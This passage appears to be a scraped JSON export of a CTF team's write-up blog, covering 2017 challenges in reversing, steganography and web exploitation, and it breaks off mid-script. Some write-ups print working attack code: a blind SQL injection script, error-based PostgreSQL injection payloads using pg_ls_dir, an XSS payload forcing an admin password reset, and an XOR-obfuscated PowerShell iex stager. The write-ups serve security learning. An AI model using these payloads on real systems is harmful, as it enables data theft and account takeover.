WQUwRShtME0MVTBEzF0BOE0gVQhNDF0wTQRVOEEEVQUwdShVOExQXTBFNF0NOE0QVTBFGFU4TRBZBTBFKG0wTRBVMERQXQE4TSBVCEzUXTBMWFUFPEUoXTB1DFU4TRhdDThBIFU4TTRVMEVUVQUwRSRdMERQbQ0wRShVOE0wWThNDFU1ME0gVTBFDF08RQxdMHTMVQUwTSBVOEEEVThNbFUwRNRVBTBFJF0wRQxtME0EVTBFAF0BOE0gVQhNDF0wTVxVOEEEVQUwdShVOEzMXTBE2F0NOE0QVTBFBFU4TKhZBTBFKG0wTQRVMEUMXTxFDF0NCE0oXTBNBFU4QQRVOEzsVQ04TShdMEUAXTBFDG0wTQhVDThNIFk4TRBVCEygXQ0wRShdPEUYXTB0zFUFME0gVThBMFU4TSBVDThNKF0wRQxdMERQbQ0wRShVOE0IWThNDFU1ME0gVTBFAF08RQRdDQhNKF0wTQxVOEBYVQUwdShVOE0EXTBFNF0NOE0QVTBFDFU4TKhZOE0QVTUwTSBVMEUYXTxFAF0NCE0oXTBNCFU4QFhVBTB1KFU4TQBdMEUIXQ04TRBVMEUAVThNDFkFMEUobTBNDFUwRFBdAThNIFUITQRdME0wVQU8RShdMHUMVThMoF0wRNhdDThNEFUwRRhVOEzEWQUwRShtME0EVTBFGF0BOE0gVQhNDF0wTVxVBTxFKF0wdQxVOEygXTBE2FxROE10VShZOTBFTF2E=\"@$plain=@()$byteString = [System.Convert]::FromBase64String($text)$xordData = $(for ($i = 0; $i -lt $byteString.length; ) &#123; for ($j = 0; $j -lt $f.length; $j++) &#123; $plain+=$byteString[$i] -bxor $f[$j] $i++ if ($i -ge $byteString.Length) &#123; $j = $f.length &#125; &#125;&#125;)iex([System.Text.Encoding]::ASCII.GetString($plain)) I removed some of the beginning of the script, it was useless code and was just printing some things to the screen, continuing with the rest we have more two steps to conclude, the first one was to play the piano accordantly to the key in the code 440,440,493,440,440,493,440,493,523,493,440,493,440,349. 12345678910While($stage1.length -lt 14)&#123; $key=(Get-Host).ui.RawUI.ReadKey(\"NoEcho,IncludeKeyDown\") $k=[String]$key.Character $f+=$k; If($keytone.Contains($k))&#123; $stage1+=[math]::floor($keytone[$k]) Write-Host ([math]::floor($keytone[$k])).toString(),$k [console]::beep($keytone[$k],500) &#125;&#125; Each key of the piano corresponds to a number this is easy to discover without having to even look at the code, I just added a few prints in the loop and go through the executable and enter the correct key for the piano was hhjhhjhjkjhjhfThe last phase is to decrypt that big base64 string with the key we got from the piano, once again we don’t even need to check the code just print the variable and you will get the last powershell script of the challenge. 1234567891011121314$plain=@()$byteString = [System.Convert]::FromBase64String($text)$xordData = $(for ($i = 0; $i -lt $byteString.length; ) &#123; for ($j = 0; $j -lt $f.length; $j++) &#123; $plain+=$byteString[$i] -bxor $f[$j] $i++ if ($i -ge $byteString.Length) &#123; $j = $f.length &#125; &#125;&#125;)iex([System.Text.Encoding]::ASCII.GetString($plain))Write-Host iex([System.Text.Encoding]::ASCII.GetString($plain))Read-Host -Prompt \"Press Enter to exit\" Now we get another powershell script but the obfuscation on this one is real asking for a password:Well it wasn’t very hard to me to reverse it, if you look closely there are alot of semicolons separating each variable assignment, for instance I checked one bye one variable and the one who looked interesting was the variable {;} 12PS C:\\Users\\root&gt; $&#123;;&#125;iex iex is an invocation, for example it can be used to run a .ps1 file, if we look closely at the end of the script we can see a very big string (in green) which is being piped into iex:if we copy that big string into the terminal we can see alot of [char]number, to easily convert them into text we can assign it into a variable and then call it and get the password!As we can see the flag was the password! SECCON{P0wEr$H311}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"python","slug":"python","permalink":"https://teamrocketist.github.io/tags/python/"},{"name":"powershell","slug":"powershell","permalink":"https://teamrocketist.github.io/tags/powershell/"},{"name":"obfuscation","slug":"obfuscation","permalink":"https://teamrocketist.github.io/tags/obfuscation/"},{"name":"seccon2017","slug":"seccon2017","permalink":"https://teamrocketist.github.io/tags/seccon2017/"}]},{"title":"[Reverse] TPCTF2017 - Bad Encryption","slug":"Reverse-TPCTF2017-Bad-Encryption","date":"2017-12-04T06:06:23.000Z","updated":"2018-10-24T23:21:04.862Z","comments":true,"path":"2017/12/04/Reverse-TPCTF2017-Bad-Encryption/","link":"","permalink":"https://teamrocketist.github.io/2017/12/04/Reverse-TPCTF2017-Bad-Encryption/","excerpt":"","text":"Bad Encryption100I was making an encryption program, but it is far from perfect. Instead of make the encryption work, I decided to just encrypt everything 100 times.Author: Kevin Higgs We have a python program, which is little bit obfuscated with this horrible named variables: 12345678910111213141516171819202122for i in range(1,101): tel1l1l1l1l1l1l1lt = \"REDACTED\" import builtins, random l1l1l1l1l1l1l1l = getattr(builtins, \"__import__\") l1l1l1l1l1l1l1l = l1l1l1l1l1l1l1l(\"PIL.Image\") l1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1l.Image l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.new(\"RGB\", (len(tel1l1l1l1l1l1l1lt), 1), \"white\") l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l = l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.load() l1l1l1l1l1l1l1ll1l1l1l111l1l11 = 0 for l1l1l1l1l1l1l1ll1l1l1l1l1l1l11 in tel1l1l1l1l1l1l1lt: l1l1l1l1l1l1l1ll1l1l1l1l1l1l11 = ord(l1l1l1l1l1l1l1ll1l1l1l1l1l1l11) l1l1l1l1l1l1l1ll1l1l1l1lll1l111 = random.randint(1,256) l1l1l1l1l1l1l1ll1l1l1l1lll1l112 = random.randint(1,256) l1l1l1l1l1l1l1ll1l1l1l1lll1l113 = random.randint(1,256) l1l1l1l1l1l1l11ll1l1l1l1lll1l111 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l111/256) l1l1l1l1l1l1l11ll1l1l1l1lll1l112 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l112/256) l1l1l1l1l1l1l11ll1l1l1l1lll1l113 = (l1l1l1l1l1l1l1ll1l1l1l1lll1l113/256) l1l121l1l1l1l11ll1l1l1l1lll1l111 = l1l1l1l1l1l1l1ll1l1l1l1l1l1l11*l1l1l1l1l1l1l11ll1l1l1l1lll1l111 l1l121l1l1l1l11ll1l1l1l1lll1l112 = l1l121l1l1l1l11ll1l1l1l1lll1l111*l1l1l1l1l1l1l11ll1l1l1l1lll1l112 l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l[l1l1l1l1l1l1l1ll1l1l1l111l1l11,0] = (l1l1l1l1l1l1l1ll1l1l1l1lll1l111, l1l1l1l1l1l1l1ll1l1l1l1lll1l112, round(l1l121l1l1l1l11ll1l1l1l1lll1l112*10)) l1l1l1l1l1l1l1ll1l1l1l111l1l11 += 1 l1l1l1l1l1l1l1ll1l1l1l1l1l1l1ll1l1l1l1l1l1l1l.save(\"out\"+str(i)+\".png\") After fixing the code to be more readable I got this: 1234567891011121314151617from PIL import Imagefor i in range(1,101): import builtins, random img = Image.new(\"RGB\", (len(flag), 1), \"white\") pixels = img.load() counter = 0 for character in flag: character = ord(character) rand0 = random.randint(1,256) rand1 = random.randint(1,256) rand3 = (rand0/256) rand4 = (rand1/256) rand5 = character*rand3 rand6 = rand5*rand4 pixels[counter,0] = (rand0, rand1, round(rand6*10)) counter += 1 img.save(\"out\"+str(i)+\".png\") We can see rand0 and rand1 are being random generated, but they are putted directly into the image in the pixels red and blue!, by having these two we can calculate round(rand6*10) easily by doing some arithmetic operations, with this we can do a script that brute-forces the flag byte by byte, by comparing the blue pixels from the image with the ones we calculated: The pseudo code:123456789101112flag = ''for character in all_printable_characters: for pixel in image: rand0 = pixel.red rand1 = pixel.blue rand3 = rand0/256 rand4 = rand1/256 rand5 = ord(character)*rand3 rand6 = rand5*rand4 if rand6 == pixel.blue: flag += character break But we ran into a problem, as the description of the challenge says sometimes the encryption doesn’t work and one of the reasons is the calculations made by the rand variables can be above 255 (Kind of depends of the random value or the character), we know that color pixels from the images can only handle colors in the range of 0-255 (in this case python will set the pixel as 255), a byte! This why the encryption does it multiple times (100) with different random values, another problem we have is once in a while multiple characters matches the same blue pixel, in these both cases we can’t know for sure if it is the character we want. So my solution to this was to ignore all characters that were above 255 and those that had multiple solutions to that byte position of the flag, since we have more than enough images (100) the characters we failed to find we can recheck them in the rest of the pictures. The final python script I used was (note that using python3 in this challenge was absolutely necessary): 123456789101112131415161718192021222324252627282930313233343536373839404142import os, sysfrom PIL import Imageimport string# flag size is 38flags = []for i in range(1,101): flag = [] im = Image.open(\"out%d.png\"%i) width = im.size[0] #define W and H height = im.size[1] pix = im.load() for x in range(0,width): stop = True found = 0 for character in string.printable: r,g,b = pix[x,0] rand0 = r rand1 = g rand3 = rand0/256 rand4 = rand1/256 rand5 = ord(character)*rand3 rand6 = rand5*rand4 if round(rand6*10) &gt;= 255: continue else: if round(rand6*10) == b: found += 1 stop = False if found == 1: flag.append(character) else: flag[x] = 'x' if stop: flag.append('x') flags.append(''.join(flag))final_flag = list('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')for flag in flags: for i,c in enumerate(flag): if c != 'x': final_flag[i] = cprint (''.join(final_flag)) Running it 12python3 reverse.pytpctf&#123;i_c4nt_7h1nk_0f_a_fUnny_f14g_:(&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"bruteforce","slug":"bruteforce","permalink":"https://teamrocketist.github.io/tags/bruteforce/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"tpctf2017","slug":"tpctf2017","permalink":"https://teamrocketist.github.io/tags/tpctf2017/"},{"name":"bytebybyte","slug":"bytebybyte","permalink":"https://teamrocketist.github.io/tags/bytebybyte/"},{"name":"python3","slug":"python3","permalink":"https://teamrocketist.github.io/tags/python3/"}]},{"title":"[Web] TPCTF2017 - Management","slug":"Web-TPCTF2017-Management","date":"2017-12-04T05:20:20.000Z","updated":"2018-10-24T23:21:04.862Z","comments":true,"path":"2017/12/04/Web-TPCTF2017-Management/","link":"","permalink":"https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-Management/","excerpt":"","text":"Management60I’ve created a new website so you can do all your important management. It includes users, creating things, reading things, and… well, not much else. Maybe there’s a flag?Second instance running at 52.90.229.46:8558tpctf{san1t1z3_y0ur_1npu7s} is not the correct flag. Look harder ;)Note: the flag format is flag{}, not the usual tpctf{}Author: Kevin Higgs Opening the website we can see we can choose the user: After doing this its shown a new form where we could read/insert into the columns data from the table users from the current user:We can see which sql query is being executed: 1SELECT `1` FROM users WHERE name = 'custom-kevin';Result: 1 It’s shown in the website! all inputs are being sanitized for the exception of the POST parameter number! I used Blind Sql injection to do this challenge (Boolean Based) the base payload I used was 11`=if((SELECT hex(substring('Abc',1,1)))=hex(substring('A',1,1)),`1`, 'False'), `1 It’s important to use HEX function because substring is case insensitive and would return wrong queries if we didn’t use it, notice that what is going to be shown in the page is the result of the comparison we are making in the sql query so if the comparison is true our query will show in the page Result: 1 if it’s false it will return Result: 0, doing this by hand is tedious so I wrote a python script to automate the stuff: 12345678910111213141516171819202122232425262728import requestsimport stringurl='http://52.90.229.46:8558'TABLE_NAME = 'SELECT hex(substring(table_name,1,%d)) FROM information_schema.tables WHERE table_schema=database() limit %d,1'SUBSTRING_HEX_NAME = \"hex(substring('&#123;&#125;',1,&#123;&#125;))\"USERS_NAME = 'SELECT hex(substring(name,1,%d)) FROM users limit %d,1'name = ''cookie = &#123;'user': 'kevin'&#125;for j in range(1,5): name = '' for i in range(1,60+1): stop = True for l in string.printable: PAYLOAD = \"1`=if((%s)=%s,`1`, 'False'),`9\" % (USERS_NAME%(i,j), SUBSTRING_HEX_NAME.format(name+l,i))#SUBSTRING_NAME.format(name+l, i)) #print PAYLOAD r = requests.post(url, data=&#123;'number':'%s'%PAYLOAD,'action':'Read', 'value':''&#125;, cookies=cookie, timeout=6) if 'Result: 1' in r.text: #print '-----------------------------------' name += l print name stop = False break if stop: break#if(1=1,sleep(6),0) Running it 123456789101112131415161718192021222324252627282930313233343536$ python management.py fflflaflagflag&#123;flag&#123;aflag&#123;aLflag&#123;aLWflag&#123;aLW4flag&#123;aLW4yflag&#123;aLW4ysflag&#123;aLW4ys_flag&#123;aLW4ys_Eflag&#123;aLW4ys_ESflag&#123;aLW4ys_ESCflag&#123;aLW4ys_ESC4flag&#123;aLW4ys_ESC4Pflag&#123;aLW4ys_ESC4PEflag&#123;aLW4ys_ESC4PE_flag&#123;aLW4ys_ESC4PE_3flag&#123;aLW4ys_ESC4PE_3vflag&#123;aLW4ys_ESC4PE_3v3flag&#123;aLW4ys_ESC4PE_3v3rflag&#123;aLW4ys_ESC4PE_3v3rYflag&#123;aLW4ys_ESC4PE_3v3rYTflag&#123;aLW4ys_ESC4PE_3v3rYTHflag&#123;aLW4ys_ESC4PE_3v3rYTH1flag&#123;aLW4ys_ESC4PE_3v3rYTH1Nflag&#123;aLW4ys_ESC4PE_3v3rYTH1NGflag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!!flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!!&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"tpctf2017","slug":"tpctf2017","permalink":"https://teamrocketist.github.io/tags/tpctf2017/"},{"name":"sqli","slug":"sqli","permalink":"https://teamrocketist.github.io/tags/sqli/"},{"name":"blindSqli","slug":"blindSqli","permalink":"https://teamrocketist.github.io/tags/blindSqli/"}]},{"title":"[Web] TPCTF2017 - It's Common Sense","slug":"Web-TPCTF2017-It-s-Common-Sense","date":"2017-12-04T04:35:42.000Z","updated":"2018-10-24T23:21:04.862Z","comments":true,"path":"2017/12/04/Web-TPCTF2017-It-s-Common-Sense/","link":"","permalink":"https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-It-s-Common-Sense/","excerpt":"","text":"It’s Common Sense100Common Sense Reviews was fixed last night. If you believe you had a working sol. last night but did not receive an email, please retry that solution. One major issue was email sending.We found this site: Common Sense ReviewsWe think the site owners are related to Pirates. Please retrieve the admin password.This challenge is not working right now, it should be back soon. If not, we will remove points received from it.This challenge should be working properly now. Expect a delay in receiving emails (approx. 3 minutes max?).Author: Steven Su A XSS challenge, we do have a register form and a login page, after signing up we can visit two forms in the account page, one is to sent a review to the admin, and the other is to reset the password (the new password was send to the email submitted in the form). My first intuition was to try easiest thing that is to steal the session cookie, unfortunately this wouldn’t work because the session cookie was protected with a http only flag, which prevents it from being stolen with XSS. The solution was to instead of trying to get the cookies we can make the admin to submit the password reset form! We can do this this with Ajax/Jquery The first line of the code is to import Jquery: 1234567891011121314&lt;script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js\"&gt;&lt;/script&gt;&lt;script&gt;$( document ).ready(function() &#123; $.ajax(&#123; type: \"POST\", url: \"/account\", data: 'email=s2020685%40mvrht.net&amp;formbtn=Send%20Request', success: function(data) &#123; console.log('success'); &#125; &#125;);&#125;);&lt;/script&gt; Submitting the form like this:If we check our own review we can notice that the post request is being done correctly and the log message success is printed in the js console: After a while we would receive an email with the flag: 1Congratulations! Normally, you would&apos;ve reset the administrators password. For the purposes of this challenge, the flag is tpctf&#123;D1D_Y0U_N0t1c3_Common_Sense_Reviews_1s_P4R7_0F_CSRF_19210jka010920aff&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"tpctf2017","slug":"tpctf2017","permalink":"https://teamrocketist.github.io/tags/tpctf2017/"},{"name":"xss","slug":"xss","permalink":"https://teamrocketist.github.io/tags/xss/"},{"name":"passwordreset","slug":"passwordreset","permalink":"https://teamrocketist.github.io/tags/passwordreset/"},{"name":"jquery","slug":"jquery","permalink":"https://teamrocketist.github.io/tags/jquery/"}]},{"title":"[Misc] TUCTF - Gr8 Pictures","slug":"Misc-TUCTF-Gr8-Pictures","date":"2017-12-01T07:58:48.000Z","updated":"2018-10-24T23:21:04.858Z","comments":true,"path":"2017/12/01/Misc-TUCTF-Gr8-Pictures/","link":"","permalink":"https://teamrocketist.github.io/2017/12/01/Misc-TUCTF-Gr8-Pictures/","excerpt":"","text":"Gr8 Pictures50The mysterious hacker 4chan is believed to be passing secret messages hidden in a picture. We know that he connects to gr8pics.tuctf.com:4444 to hide his message in the picture. Your mission, should you choose to accept it, is to find out what message he is trying to hide.nc gr8pics.tuctf.com 4444If you get connection refused, use nc gr8pics.tuctf.com 41234NOTE: the server does not show a prompt, but if the connection is successful, you are at the correct starting point.NOTE: without connecting to the server, the flag is theoretically cryptographically impossible to getNOTE: If you’re getting a bunch of data that doesn’t seem to stop - it stops after ~3MB of datasha19044fe96a50ecb831fe451f13c24cc96b0a9e24d flag.png This was a simple misc, we were told in the challenge description that a hacker from 4chan was using this service to hide messages within images, if we sent a message with a length &gt;= 50 the service would return an image with the message hidden within in the image, after receiving it I noticed that the only difference between the image given from the challenge and the one generated in the service was 50 bytes (which makes sense since I sent a message with 50 length), I was suspicious that the server were encrypting the message using a simple xor so to test this I sent 50 null bytes to the service: 1$ python -c \"print '\\x00'*50\" | nc gr8pics.tuctf.com 4444 | base64 -d &gt; flag2.png But why send only null bytes? If they are using xor we can retrieve the key completely! xoring any number by zero will return always the number! You could easily get the 50 new bytes by comparing all non equal bytes between flag.png flag2.png: 123456789101112131415from pwn import *file2 = open('flag2.png', 'rb')file = open('flag.png', 'rb')s = bytearray(file.read())s2 = bytearray(file2.read())k = 0key = ''flag = ''for i in range(len(s)): if s[i] != s2[i]: key += chr(s2[i])print key By running it we could easily get the key!12$ python misc50.pyIsnt_x0r_such_@_c00l_function?Im_such_a_1337_hax0r Having the key is easy to decrypt the original flag we just need to adapt our script to: 12345678910111213141516from pwn import *file2 = open('test.png', 'rb')file = open('flag.png', 'rb')s = bytearray(file.read())s2 = bytearray(file2.read())k = 0key = ''flag = ''for i in range(len(s)): if s[i] != s2[i]: key += chr(s2[i]) flag += chr(s[i] ^ s2[i])print keyprint flag And finally the flag: 123$ python misc50.pyIsnt_x0r_such_@_c00l_function?Im_such_a_1337_hax0rTUCTF&#123;st3g@n0gr@phy's_so_c00l,No0ne_steals_my_msg&#125;","categories":[{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/categories/Misc/"}],"tags":[{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"misc","slug":"misc","permalink":"https://teamrocketist.github.io/tags/misc/"},{"name":"stego","slug":"stego","permalink":"https://teamrocketist.github.io/tags/stego/"}]},{"title":"[Reverse] TUCTF - Unknown","slug":"Reverse-TUCTF-Unknown","date":"2017-11-27T05:27:55.000Z","updated":"2018-10-24T23:21:04.838Z","comments":true,"path":"2017/11/27/Reverse-TUCTF-Unknown/","link":"","permalink":"https://teamrocketist.github.io/2017/11/27/Reverse-TUCTF-Unknown/","excerpt":"","text":"Unknown200Diggin through some old files we discovered this binary. Although despite our inspection we can’t figure out what it does. Or what it wants…unknown - md5: 9f08f6e8240d4a0e098c4065c5737ca6 Reversing the binaryThe binary has the following restrictions, we need to provide the correct flag as argv[1] and the length of the flag must have 56 of length as we can see bellow in the assembly:After this initial checks we are going to have a loop that checks each byte of the flag provided using a big encryption function fcn.00401e90, we can easily check if the byte is correct or not by checking the value of RAX after the function returns as it is explained in the image below: Radare2 ScriptWe don’t really need to reverse the encryption function fcn.00401e90, since we can write a radare2 script that checks the return values(RAX) from this function we can just brute-force the flag byte by byte, we need to update the address where the string is stored at each iteration/tentative, and in failed attempts we need to decrement the counter of the loop so we can recheck the same flag byte, this can be done with a script like this: 1234567891011121314151617181920212223242526272829303132333435363738394041424344import r2pipeimport stringimport sysdef transform_string(s): return ''.join(['%x'% ord(c) for c in s])def change_address_value(addr, value): r2.cmd('s %s' % addr) r2.cmd('wx %s' % value) r2.cmd('s rip') flag_try = 'TUCTF&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#125;'flag_list = list(flag_try)r2=r2pipe.open('./unknown', flags=['-2'])r2.cmd(\"ood %s\" % flag_try)r2.cmd(\"aa\")r2.cmd(\"db 0x401c39\")r2.cmd(\"db 0x401C82\")r2.cmd(\"dc\")flag_address = r2.cmd(\"dr rax\")r2.cmd(\"dc\")characters = string.ascii_lowercase+ string.digits + '_!&#125;'for j in range(0,len(flag_list)): for i,s in enumerate(characters): if j &gt; 5: flag_list[j] = s change_address_value(flag_address, transform_string(''.join(flag_list))) num = r2.cmd('dr rax') if int(num,16) == 0x0: if j &gt; 5: flag_list[j] = characters[i-1] change_address_value(flag_address, transform_string(''.join(flag_list))) r2.cmd('dc') break else: r2.cmd('dr rax = 0x0') change_address_value('rbp-0xc', '%02x000000' % (j-1)) r2.cmd('dc') sys.stdout.write('\\r'+''.join(flag_list)) sys.stdout.flush() Running it: 12$ python unknown.pyTUCTF&#123;w3lc0m3_70_7uc7f_4nd_7h4nk_y0u_f0r_p4r71c1p471n6!&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"radare2","slug":"radare2","permalink":"https://teamrocketist.github.io/tags/radare2/"},{"name":"bytebybyte","slug":"bytebybyte","permalink":"https://teamrocketist.github.io/tags/bytebybyte/"},{"name":"r2script","slug":"r2script","permalink":"https://teamrocketist.github.io/tags/r2script/"},{"name":"tuctf2017","slug":"tuctf2017","permalink":"https://teamrocketist.github.io/tags/tuctf2017/"}]},{"title":"[Electronics] Pwn2Win - Top Secret","slug":"Electronics-Pwn2Win-Top-Secret","date":"2017-10-28T15:25:56.000Z","updated":"2018-10-24T23:21:04.858Z","comments":true,"path":"2017/10/28/Electronics-Pwn2Win-Top-Secret/","link":"","permalink":"https://teamrocketist.github.io/2017/10/28/Electronics-Pwn2Win-Top-Secret/","excerpt":"","text":"Top SecretMolly was able to take pictures of a strange digital circuit sketch, along with an also strange message. All of these things were inside an envelope in a safe, which was labeled “Top Secret”.We believe it might contain Butcher Corp’s plans for the future, can you help us read the message?LinkMirrorId: top_secretTotal solves: 40Score: 223Categories: Eletronics To solve this problem the circuit is first analyzed and divided in to different blocks based on their function. The circuit can be divided in to four different functional blocks: The counter, the Multiplexer (LED Matrix line driver), the input circuit (LED Matrix column driver) and the 8x8 LED Matrix (the Output). The counter circuit counts from 0 to 7, the increments are done every falling edge. The clock is the 0 input. The output of the counter is a 3-line binary number that is the line selection input of the multiplexer circuit. The main input of the multiplexer is connected to a high signal (binary 1). The multiplexer puts one line of its outputs (8 line multiplexer) in a high state and all others at a low state. The 3-line input from the counter selects the line which is to be put in a high state. The line output of the multiplexer is connected to a BJT transistor that connects the LED Matrix line to a low signal (binary 0) when this multiplexer output is in a high state. Basically, the BJT transistor works like a NOT gate. In the input block every input is also connected to a BJT transistor. When an input is in the high state, the transistor connects the LED matrix column to a logical 0, and vice versa when the input is in a low state. Again, basically like a NOT gate. Some inputs have two transistors in series, so basically to NOT gates in series, and therefore here when the input signal is in a high state, the corresponding column is also in a high state. Finally, in the LED matrix, every led is connected from a column to a line. A LED lights up when the column is in a logical high state and the line in a logical low state. Combing this information with the received input sequence and aligning the date with all the inputs (0 to 8), it is possible to decode what is shown in the LED matrix. To do this, the data is aligned and then imported to excel where, with some simple logic, the needed bits are flipped (based on the NOT inputs) and then with conditional formatting the LED outputs are simulated, RED is an off led and green a ON led. This is shown in the picture below, for the first character only, where the table on the left is the original data and the table on the left the interpreted data. The full excel file can be found in this link.","categories":[{"name":"Electronics","slug":"Electronics","permalink":"https://teamrocketist.github.io/categories/Electronics/"}],"tags":[{"name":"electronics","slug":"electronics","permalink":"https://teamrocketist.github.io/tags/electronics/"},{"name":"circuits","slug":"circuits","permalink":"https://teamrocketist.github.io/tags/circuits/"},{"name":"transistor","slug":"transistor","permalink":"https://teamrocketist.github.io/tags/transistor/"},{"name":"led","slug":"led","permalink":"https://teamrocketist.github.io/tags/led/"},{"name":"logic","slug":"logic","permalink":"https://teamrocketist.github.io/tags/logic/"},{"name":"multiplexer","slug":"multiplexer","permalink":"https://teamrocketist.github.io/tags/multiplexer/"}]},{"title":"[Web] Pwn2Win - Criminals","slug":"Web-Pwn2Win-Criminals","date":"2017-10-24T06:53:16.000Z","updated":"2018-10-24T23:21:04.858Z","comments":true,"path":"2017/10/24/Web-Pwn2Win-Criminals/","link":"","permalink":"https://teamrocketist.github.io/2017/10/24/Web-Pwn2Win-Criminals/","excerpt":"","text":"CriminalsHey, Rebellious member, let’s hack this Bloodsuckers web app. I think they keep some secret.http://200.136.213.109/Automated tools are NOT required and NOT allowed.Id: criminalsTotal solves: 9Score: 363Categories: Web This web challenge only has one page and has this form bellow: The form has 4 inputs if we test each one of them with a single quote we will notice that an error pops up and we can see the admin of the website did use prepared statements but forgot about the order GET param:Now to solve this challenge we need first to check which dbms is running by just checking the error in the image we can see that is running on HBL (The Hibernate Query Language), some kind of a modified SQL with some restrictions, before talking about this lets first find which dbms is running: 12345678$ curl 'http://200.136.213.109/' --data \"name=&amp;age=&amp;crime=&amp;order=abs(1)||2\" 2&gt;/dev/null | grep 'post'&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.postgresql.util.PSQLException: ERROR: operator does not exist: integer || integer org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2102) org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:1835) org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:257) org.postgresql.jdbc2.AbstractJdbc2Statement.execute(AbstractJdbc2Statement.java:500) org.postgresql.jdbc2.AbstractJdbc2Statement.executeWithFlags(AbstractJdbc2Statement.java:388) org.postgresql.jdbc2.AbstractJdbc2Statement.executeQuery(AbstractJdbc2Statement.java:273) With this query we can generate an error that leaks the dbms it’s postgresql! now we need to find a way to inject and dump the database, I knew some injections in order by with mysql but in postgresql is somehow different and what the worst about this are the limitations we got from HBL. AAfter spending alot of time trying to execute a subquery, I started searching on google, I knew we needed to something related with XML queries (Order by injections in MySql are similar) and then I found this great slides: https://conference.hitb.org/hitbsecconf2016ams/materials/D2T2%20-%20Mikhail%20Egorov%20and%20Sergey%20Soldatov%20-%20New%20Methods%20for%20Exploiting%20ORM%20Injections%20in%20Java%20Applications.pdf This is perfect to put in the order by query this will return an integer and we can execute a subquery like we wanted, but the question is how are we going to leaking info? Postgres has a very nice feature, if we cast a string into an integer from a select for example we will generate an error! and the output of that sql query will be printed in the error! For this I used another function called pg_ls_dir this can list directories, if we use this to list the current directory and cast it into integer we are going to generate an error, leaking the directory for example: 1array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir(CHR(46))as int)', true, false,'')),1) The output of this query is: As you can see above we leaked one directory named pg_xlog we can do exactly the same but instead of trying to read the log files we can leak the tables like this: 1array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 0)) as int)', true, false,'')),1) The output of this query is:12345$ curl 'http://200.136.213.109/' --data \"name=&amp;age=&amp;crime=&amp;order=array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 0)) as int)', true, false,'')),1)\" 2&gt;/dev/null | grep 'root cause'&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;javax.persistence.PersistenceException: org.hibernate.exception.GenericJDBCException: could not extract ResultSet&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.hibernate.exception.GenericJDBCException: could not extract ResultSet&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.postgresql.util.PSQLException: ERROR: could not open directory &amp;quot;secret,flag&amp;quot;: No such file or directory&lt;/pre&gt;&lt;p&gt;&lt;b&gt;note&lt;/b&gt; &lt;u&gt;The full stack trace of the root cause is available in the Apache Tomcat/8.0.47 logs.&lt;/u&gt;&lt;/p&gt;&lt;hr class=\"line\"&gt;&lt;h3&gt;Apache Tomcat/8.0.47&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; We just leaked the table flag and the column secret! we can easily write a python script that leaks all the tables and gets the flag for us like this: 1234567891011121314151617import requestsimport rehost = 'http://200.136.213.109/'data = &#123;'name':'','crime':'','order':'','age':''&#125;query = \"array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset &#123;&#125;)) as int)', true, false,'')),1)\"queryflag = \"array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT secret FROM flag c limit 